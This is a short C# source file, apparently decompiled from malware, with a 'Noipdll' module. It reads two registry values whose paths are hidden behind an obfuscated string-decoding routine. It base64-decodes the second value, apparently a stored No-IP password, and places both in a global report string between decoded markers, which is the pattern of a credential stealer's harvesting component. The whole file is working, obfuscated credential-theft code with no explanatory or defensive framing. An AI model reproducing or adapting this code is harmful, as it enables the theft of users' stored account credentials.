using System;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class DANoip
{
	public class Noipdll
	{
		public static void GTMYNo()
		{
			string text = "";
			string text2 = "";
			try
			{
				text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(LOOTCKC.IPNPIWT("jauwy8ORr66zsKStrLWsjq6wzreUpr/JpZelx8jNucHX6cm3y97OqJqjAw==", "False"), LOOTCKC.IPNPIWT("hr+80L6SubwY", "False"), (object)null));
				text2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(LOOTCKC.IPNPIWT("dpSZtKx6mJecmY2WlZ6Vd5eZt6B9j6iyjoCOsLG2oqrA0rKgtMe3kYOMGg==", "False"), LOOTCKC.IPNPIWT("lMDd5Nqz0c4F", "False"), (object)null));
				KVPXNIVH.PNBSI = LOOTCKC.IPNPIWT("cIuWnY9wi5adj3CLp89/fJ6WnY9wi5adj3CLlPP2cBQ=", "False") + Environment.NewLine + Environment.NewLine + text + Environment.NewLine + b64dc(text2) + Environment.NewLine + LOOTCKC.IPNPIWT("aIOOlYdog46Vh2iDjpWHaIOOlYdog46Vh2iDjpWHaIMd", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				KVPXNIVH.PNBSI = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string b64dc(string data)
		{
			string result = default(string);
			try
			{
				UTF8Encoding uTF8Encoding = new UTF8Encoding();
				Decoder decoder = uTF8Encoding.GetDecoder();
				byte[] array = Convert.FromBase64String(data);
				int charCount = decoder.GetCharCount(array, 0, array.Length);
				char[] array2 = new char[checked(charCount - 1 + 1)];
				decoder.GetChars(array, 0, array.Length, array2, 0);
				string text = new string(array2);
				result = text;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
